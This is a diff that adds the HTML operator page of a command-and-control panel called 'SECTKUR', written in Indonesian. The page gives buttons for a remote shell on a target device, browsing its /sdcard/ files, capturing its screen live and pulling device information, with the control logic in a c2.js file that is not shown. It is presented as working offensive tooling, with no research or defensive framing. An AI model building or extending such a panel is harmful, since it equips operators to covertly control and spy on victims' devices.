@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>C2 Control — SECTKUR</title>
+<link rel="stylesheet" href="/css/style.css">
+<!-- Socket.IO Client -->
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body>
+<button class="sidebar-toggle" id="sidebar-toggle">☰</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+<div class="logo" style="font-size:1.1rem;margin-bottom:1rem;">SECTKUR</div>
+<nav class="sidebar-nav">
+<a href="/dashboard">Dashboard</a>
+<a href="/c2-panel" class="active">C2 Control</a>
+<a href="#" id="nav-logout">Logout</a>
+</nav>
+</aside>
+<main class="main-content">
+<div class="dashboard-header">
+<div>
+<h1 style="font-size:1.8rem;margin-bottom:0.5rem;">C2 CONTROL PANEL</h1>
+<p class="text-dim" style="font-size:0.85rem;">Target: <span id="c2-appuid" style="color:var(--blood);">...</span></p>
+</div>
+<div id="device-status" class="role-badge expired">WAITING...</div>
+</div>
+
+<div class="card mb-3">
+  <div class="flex gap-1" style="flex-wrap:wrap;">
+    <button class="action-btn gold" onclick="switchTab('shell')">Remote Shell</button>
+    <button class="action-btn gold" onclick="switchTab('file')">File Manager</button>
+    <button class="action-btn gold" onclick="switchTab('screen')">Screen Capture</button>
+    <button class="action-btn gold" onclick="switchTab('info')">Device Info</button>
+  </div>
+</div>
+
+<!-- TAB SHELL -->
+<div id="tab-shell" class="card">
+  <h3 style="color:var(--blood);margin-bottom:1rem;">Terminal</h3>
+  <div class="terminal-log" id="term-output" style="height:300px;overflow-y:auto;background:var(--bg);border:1px solid var(--border);padding:1rem;font-family:monospace;font-size:0.8rem;color:#4ade80;">
+    <div>Menunggu koneksi device...</div>
+  </div>
+  <div class="flex gap-1 mt-2">
+    <span style="color:var(--blood);padding-top:10px;">$</span>
+    <input type="text" id="term-input" placeholder="Ketik perintah (contoh: ls -la)" style="flex:1;" onkeypress="if(event.key==='Enter') sendShellCmd()">
+    <button class="btn-primary" onclick="sendShellCmd()">Kirim</button>
+  </div>
+</div>
+
+<!-- TAB FILE MANAGER -->
+<div id="tab-file" class="card hidden">
+  <h3 style="color:var(--blood);margin-bottom:1rem;">File Manager</h3>
+  <div class="flex gap-1 mb-2">
+    <input type="text" id="file-path" value="/sdcard/" style="flex:1;">
+    <button class="btn-primary" onclick="listFiles()">Buka</button>
+  </div>
+  <div class="table-wrap" style="max-height:300px;">
+    <table id="file-table">
+      <thead><tr><th>Nama File</th><th>Tipe</th><th>Aksi</th></tr></thead>
+      <tbody id="file-tbody"><tr><td colspan="3" class="text-center text-dim">Belum ada data.</td></tr></tbody>
+    </table>
+  </div>
+</div>
+
+<!-- TAB SCREEN CAPTURE -->
+<div id="tab-screen" class="card hidden">
+  <h3 style="color:var(--blood);margin-bottom:1rem;">Live Screen</h3>
+  <div style="background:var(--bg);border:1px solid var(--border);padding:1rem;text-align:center;min-height:300px;display:flex;align-items:center;justify-content:center;">
+    <img id="screen-img" src="" alt="Screenshot" style="max-width:100%;max-height:400px;display:none;border:1px solid var(--blood);">
+    <span id="screen-placeholder" class="text-dim">Klik tombol di bawah untuk mengambil screenshot.</span>
+  </div>
+  <button class="btn-primary mt-2" onclick="captureScreen()" style="width:100%;">Ambil Screenshot</button>
+</div>
+
+<!-- TAB DEVICE INFO -->
+<div id="tab-info" class="card hidden">
+  <h3 style="color:var(--blood);margin-bottom:1rem;">Device Information</h3>
+  <div class="terminal-log" id="info-output" style="background:var(--bg);border:1px solid var(--border);padding:1rem;font-family:monospace;font-size:0.8rem;color:var(--text);">
+    <div>Menunggu data device...</div>
+  </div>
+  <button class="btn-primary mt-2" onclick="getDeviceInfo()" style="width:100%;">Refresh Info</button>
+</div>
+
+</main>
+</div>
+<div class="toast" id="toast"></div>
+
+<script src="/js/firebase-config.js"></script>
+<script type="module" src="/js/c2.js"></script>
+</body>
+</html>
